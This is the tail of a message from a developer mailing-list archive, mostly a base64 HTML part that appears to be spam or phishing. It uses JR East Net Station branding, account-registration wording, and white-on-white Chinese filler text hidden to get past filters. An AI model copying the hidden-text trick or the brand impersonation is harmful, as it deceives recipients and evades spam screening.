jOOBn+WgtOWQiOOCguOAgeaWsOOBn+OBq+OCouOCq+OCpuODs+ODiOeZu+mMsu+8iOeEoeaWmeeZ
u+mMsu+8ieOBl+OBpuOBhOOBnyANCiAgICDjgaDjgY/jgZPjgajjgafjgZnjgZDjgavjgIzjgYjj
gY3jga3jgaPjgajjgI3jgpLjgZTliKnnlKjjgYTjgZ/jgaDjgY/jgZPjgajjgYzjgafjgY3jgb7j
gZnjga7jgafjgIHku4rlvozjgoLjgZTmhJvpoafjgYTjgZ8g44Gg44GR44G+44GZ44KI44GG44KI
44KN44GX44GP44GK6aGY44GE44GE44Gf44GX44G+44GZ44CCJm5ic3A7PC9QPg0KICAgIDxQPjxC
Uj48L1A+DQogICAgPFAgYWxpZ249Y2VudGVyPjxTUEFOIA0KICAgIHN0eWxlPSJGT05ULVNJWkU6
IDExcHg7IEZPTlQtRkFNSUxZOiAnTm90byBTZXJpZiBKYXBhbmVzZScsIHNhbnMtc2VyaWY7IFdI
SVRFLVNQQUNFOiBub3JtYWw7IFdPUkQtU1BBQ0lORzogMHB4OyBURVhULVRSQU5TRk9STTogbm9u
ZTsgRkxPQVQ6IG5vbmU7IEZPTlQtV0VJR0hUOiA0MDA7IENPTE9SOiByZ2IoNTEsNTEsNTEpOyBG
T05ULVNUWUxFOiBub3JtYWw7IFRFWFQtQUxJR046IGNlbnRlcjsgT1JQSEFOUzogMjsgV0lET1dT
OiAyOyBESVNQTEFZOiBpbmxpbmUgIWltcG9ydGFudDsgTEVUVEVSLVNQQUNJTkc6IG5vcm1hbDsg
QkFDS0dST1VORC1DT0xPUjogcmdiKDI0NSwyNDUsMjQ1KTsgVEVYVC1JTkRFTlQ6IDBweDsgLXdl
YmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyB0ZXh0LWRlY29yYXRpb24tc3R5bGU6IGluaXRp
YWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbDsgZm9udC12YXJpYW50LWxpZ2F0dXJl
czogbm9ybWFsOyBmb250LXZhcmlhbnQtY2Fwczogbm9ybWFsOyB0ZXh0LWRlY29yYXRpb24tdGhp
Y2tuZXNzOiBpbml0aWFsIj4mbmJzcDsgDQogICAgQ29weXJpZ2h0IMKpIEpSIEVhc3QgTmV0IFN0
YXRpb24gQ28uLEx0ZC4gQWxsIFJpZ2h0cyBSZXNlcnZlZC48L1NQQU4+PEJSPjwvUD4NCiAgICA8
UD48QlI+PC9QPg0KICAgIDxQPjxCUiBjbGFzcz1BcHBsZS1pbnRlcmNoYW5nZS1uZXdsaW5lPjxG
T05UIGNvbG9yPXdoaXRlPuW3ieW0liANCiAgICDkuI7mnIvlj4vkuqTvvIzoqIDogIzmnInkv6Hj
gII8L0ZPTlQ+PC9QPg0KICAgIDxQPjxGT05UIGNvbG9yPXdoaXRlPumcremcreaYpeepuiDpmL/l
n7rnsbPlvrfonrrnur8g6JSh5a6a5YabY2FpZGluZ2p1bjwvRk9OVD48L1A+DQogICAgPFA+PEZP
TlQgY29sb3I9I2ZmZmZmZj7pnK3pnK3mmKXnqbogDQogICAg6Im+5Lymwrfph5Hmlq/loKHmrbvk
uo7ljrvlubTlm5vmnIjkupTlj7fvvIzkuK3lm73nmoTmuIXmmI7oioLjgILmja7or7TlvZPml7bk
u5blt7LlpITkuo7mmI/ov7fnirbmgIHvvIzogIznl4XmiL/mjKTmu6HkuobmnIvlj4vvvIzllp3p
hZLogYrlpKnvvIzkubHlk4Tlk4TvvIzmsqHmnInkuIDngrnlhL/mgrLlk4DnmoTmhI/mgJ3jgILp
gqPliLvmhI/okKXpgKDnmoTmsJTmsJvvvIzmmK/kuLrkuoblh4/ovbvoib7kvKbkuLTnu4jnmoTl
raTni6zmhJ/vvJrkurrnlJ/lpoLogZrkvJrvvIzmgLvmnInov5/liLDml6npgIDnmoTjgILmraPl
vZPogZrkvJrotovlkJHpq5jmva7vvIzku5bkuI3ovp7ogIzliKvjgILmiJHnkKLno6jvvIzoib7k
vKbnmoTngbXprYLlpJrlsJHkuI7kvJfkuI3lkIzvvIzluKblmLblmLblo7Dlk43lkoznu7/oibLn
gavnhLDvvIzlkbzllbjogIzljrvjgILmiJHmg7Potbfku5bnmoTor5flj6XvvJrlpbPlo6vku6zv
vIzmipPkvY/kvaDku6znmoToo5nlrZDvvIznjrDlnKjlh4blpIfkuIvlnLDni7HllabigKbigKYg
DQogICAg6KGM5bC46LWw6IKJIOmYv+Wfuuexs+W+t+ieuue6vzwvRk9OVD48L1A+DQogICAgPFA+
PEZPTlQgY29sb3I9I2ZmZmZmZj7olKHlrprlhptjYWlkaW5nanVuIA0KICAgIOiJvuS8psK36YeR
5pav5aCh5q275LqO5Y675bm05Zub5pyI5LqU5Y+377yM5Lit5Zu955qE5riF5piO6IqC44CC5o2u
6K+05b2T5pe25LuW5bey5aSE5LqO5piP6L+354q25oCB77yM6ICM55eF5oi/5oyk5ruh5LqG5pyL
5Y+L77yM5Zad6YWS6IGK5aSp77yM5Lmx5ZOE5ZOE77yM5rKh5pyJ5LiA54K55YS/5oKy5ZOA55qE
5oSP5oCd44CC6YKj5Yi75oSP6JCl6YCg55qE5rCU5rCb77yM5piv5Li65LqG5YeP6L276Im+5Lym
5Li057uI55qE5a2k54us5oSf77ya5Lq655Sf5aaC6IGa5Lya77yM5oC75pyJ6L+f5Yiw5pep6YCA
55qE44CC5q2j5b2T6IGa5Lya6LaL5ZCR6auY5r2u77yM5LuW5LiN6L6e6ICM5Yir44CC5oiR55Ci
56Oo77yM6Im+5Lym55qE54G16a2C5aSa5bCR5LiO5LyX5LiN5ZCM77yM5bim5Zi25Zi25aOw5ZON
5ZKM57u/6Imy54Gr54Sw77yM5ZG85ZW46ICM5Y6744CC5oiR5oOz6LW35LuW55qE6K+X5Y+l77ya
5aWz5aOr5Lus77yM5oqT5L2P5L2g5Lus55qE6KOZ5a2Q77yM546w5Zyo5YeG5aSH5LiL5Zyw54ux
5ZWm4oCm4oCmIA0KICAgIOW3ieW0liDkuI7mnIvlj4vkuqTvvIzoqIDogIzmnInkv6HjgIIgDQog
ICAg6Im+5Lymwrfph5Hmlq/loKHmrbvkuo7ljrvlubTlm5vmnIjkupTlj7fvvIzkuK3lm73nmoTm
uIXmmI7oioLjgILmja7or7TlvZPml7bku5blt7LlpITkuo7mmI/ov7fnirbmgIHvvIzogIznl4Xm
iL/mjKTmu6HkuobmnIvlj4vvvIzllp3phZLogYrlpKnvvIzkubHlk4Tlk4TvvIzmsqHmnInkuIDn
grnlhL/mgrLlk4DnmoTmhI/mgJ3jgILpgqPliLvmhI/okKXpgKDnmoTmsJTmsJvvvIzmmK/kuLrk
uoblh4/ovbvoib7kvKbkuLTnu4jnmoTlraTni6zmhJ/vvJrkurrnlJ/lpoLogZrkvJrvvIzmgLvm
nInov5/liLDml6npgIDnmoTjgILmraPlvZPogZrkvJrotovlkJHpq5jmva7vvIzku5bkuI3ovp7o
gIzliKvjgILmiJHnkKLno6jvvIzoib7kvKbnmoTngbXprYLlpJrlsJHkuI7kvJfkuI3lkIzvvIzl
uKblmLblmLblo7Dlk43lkoznu7/oibLngavnhLDvvIzlkbzllbjogIzljrvjgILmiJHmg7Potbfk
u5bnmoTor5flj6XvvJrlpbPlo6vku6zvvIzmipPkvY/kvaDku6znmoToo5nlrZDvvIznjrDlnKjl
h4blpIfkuIvlnLDni7HllabigKbigKY8L0ZPTlQ+PC9QPg0KICAgIDxQPjxGT05UIGNvbG9yPSNm
ZmZmZmY+5LiO5pyL5Y+L5Lqk77yM6KiA6ICM5pyJ5L+h44CCIOW3ieW0liANCiAgICDoib7kvKbC
t+mHkeaWr+Wgoeatu+S6juWOu+W5tOWbm+aciOS6lOWPt++8jOS4reWbveeahOa4heaYjuiKguOA
guaNruivtOW9k+aXtuS7luW3suWkhOS6juaYj+i/t+eKtuaAge+8jOiAjOeXheaIv+aMpOa7oeS6
huaci+WPi++8jOWWnemFkuiBiuWkqe+8jOS5seWThOWThO+8jOayoeacieS4gOeCueWEv+aCsuWT
gOeahOaEj+aAneOAgumCo+WIu+aEj+iQpemAoOeahOawlOawm++8jOaYr+S4uuS6huWHj+i9u+iJ
vuS8puS4tOe7iOeahOWtpOeLrOaEn++8muS6uueUn+WmguiBmuS8mu+8jOaAu+aciei/n+WIsOaX
qemAgOeahOOAguato+W9k+iBmuS8mui2i+WQkemrmOa9ru+8jOS7luS4jei+nuiAjOWIq+OAguaI
keeQouejqO+8jOiJvuS8pueahOeBtemtguWkmuWwkeS4juS8l+S4jeWQjO+8jOW4puWYtuWYtuWj
sOWTjeWSjOe7v+iJsueBq+eEsO+8jOWRvOWVuOiAjOWOu+OAguaIkeaDs+i1t+S7lueahOivl+WP
pe+8muWls+Wjq+S7rO+8jOaKk+S9j+S9oOS7rOeahOijmeWtkO+8jOeOsOWcqOWHhuWkh+S4i+Wc
sOeLseWVpuKApuKApiANCiAgICDooYzlsLjotbDogokg5beJ5bSWPC9GT05UPjwvUD4NCiAgICA8
UD48Rk9OVCBjb2xvcj0jZmZmZmZmPkNoYXB0ZXIgMS4gQmVhdXR5IG9mIHRoZSBCcmlnYWRlcy4g
6Zi/5Z+657Gz5b636J6657q/IOmcremcreaYpeepuiANCiAgICDkuI7mnIvlj4vkuqTvvIzoqIDo
gIzmnInkv6HjgII8L0ZPTlQ+PC9QPjwvRElWPjwvVFI+PC9UQk9EWT48L1RBQkxFPjwvQk9EWT48
L0hUTUw+DQo=

------=_NextPart_000_0A75_0127B5F5.18090E90--



--===============5244344488920732087==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5244344488920732087==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5244344488920732087==--


